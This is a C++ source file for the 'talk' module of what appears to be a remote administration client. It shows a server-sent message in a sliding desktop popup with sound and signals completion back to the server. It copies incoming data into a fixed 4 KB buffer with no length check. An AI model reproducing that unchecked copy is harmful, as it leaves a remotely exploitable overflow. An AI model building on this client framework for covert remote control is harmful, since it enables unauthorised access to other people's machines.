// TalkManager.cpp: implementation of the CTalkManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "TalkManager.h"
#include "Common.h"
#include "resource.h"
#include <IOSTREAM>
#include <mmsystem.h>

#pragma comment(lib, "WINMM.LIB")
using namespace std;
#define ID_TIMER_POP_WINDOW		1
#define ID_TIMER_DELAY_DISPLAY	2 
#define ID_TIMER_CLOSE_WINDOW	3 

#define WIN_WIDTH		360   
#define WIN_HEIGHT		200
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char     g_Buffer[0x1000] = {0};
UINT_PTR g_Event  = 0;

IOCPClient* g_IOCPClientObject = NULL;

extern HINSTANCE 	g_hInstance;

CTalkManager::CTalkManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
{
	BYTE	bToken = TOKEN_TALK_START;      //包含头文件 Common.h     
	m_ClientObject->OnServerSending((char*)&bToken, 1);
	g_IOCPClientObject = ClientObject;
	WaitForDialogOpen();
}

CTalkManager::~CTalkManager()
{
	cout<<"Talk 析构\n";
}

VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();
			break;
		}

	default:
		{
			memcpy(g_Buffer, szBuffer, ulLength);
			//创建一个DLG
			DialogBox(g_hInstance,MAKEINTRESOURCE(IDD_DIALOG),
				NULL,DialogProc);  //SDK   C   MFC  C++
			break;
		}
	}
}

int CALLBACK CTalkManager::DialogProc(HWND hDlg, unsigned int uMsg,
									  WPARAM wParam, LPARAM lParam)
{
	switch(uMsg)
	{
	case WM_TIMER:
		{
			OnDlgTimer(hDlg);
			break;
		}
	case WM_INITDIALOG:
		{
			OnInitDialog(hDlg);   
			break;
		}
	}

	return 0;
}


VOID CTalkManager::OnInitDialog(HWND hDlg)
{
	MoveWindow(hDlg, 0, 0, 0, 0, TRUE);

	static HICON hIcon = LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON_MSG));
	::SendMessage(hDlg, WM_SETICON, (WPARAM)hIcon, (LPARAM)hIcon);

	SetDlgItemText(hDlg,IDC_EDIT_MESSAGE,g_Buffer);

	::SetFocus(GetDesktopWindow());

	memset(g_Buffer,0,sizeof(g_Buffer));

	g_Event = ID_TIMER_POP_WINDOW;
	SetTimer(hDlg, g_Event, 1, NULL);  //时钟回调   

	PlaySound(MAKEINTRESOURCE(IDR_WAVE),
		g_hInstance,SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
}


VOID CTalkManager::OnDlgTimer(HWND hDlg)   //时钟回调
{	
	RECT  Rect;
	static int Height=0;
	SystemParametersInfo(SPI_GETWORKAREA, 0, &Rect,0);
	int y=Rect.bottom-Rect.top;;
	int x=Rect.right-Rect.left;
	x=x-WIN_WIDTH;

	switch(g_Event)
	{
	case ID_TIMER_CLOSE_WINDOW:
		{
			if(Height>=0)
			{
				Height-=5;
				MoveWindow(hDlg, x,y-Height, WIN_WIDTH, Height,TRUE);
			}
			else
			{
				KillTimer(hDlg,ID_TIMER_CLOSE_WINDOW);
				BYTE bToken = TOKEN_TALKCMPLT;				// 包含头文件 Common.h     
				g_IOCPClientObject->OnServerSending((char*)&bToken, 1); // 发送允许重新发送的指令
				EndDialog(hDlg,0);
			}
			break;
		}
	case ID_TIMER_DELAY_DISPLAY:
		{
			KillTimer(hDlg,ID_TIMER_DELAY_DISPLAY);
			g_Event = ID_TIMER_CLOSE_WINDOW;
			SetTimer(hDlg,g_Event, 5, NULL);
			break;
		}
	case ID_TIMER_POP_WINDOW:
		{
			if(Height<=WIN_HEIGHT)
			{
				Height+=3;
				MoveWindow(hDlg ,x, y-Height, WIN_WIDTH, Height,TRUE);
			}
			else
			{
				KillTimer(hDlg,ID_TIMER_POP_WINDOW);
				g_Event = ID_TIMER_DELAY_DISPLAY;
				SetTimer(hDlg,g_Event, 4000, NULL);
			}
			break;
		}
	}
}
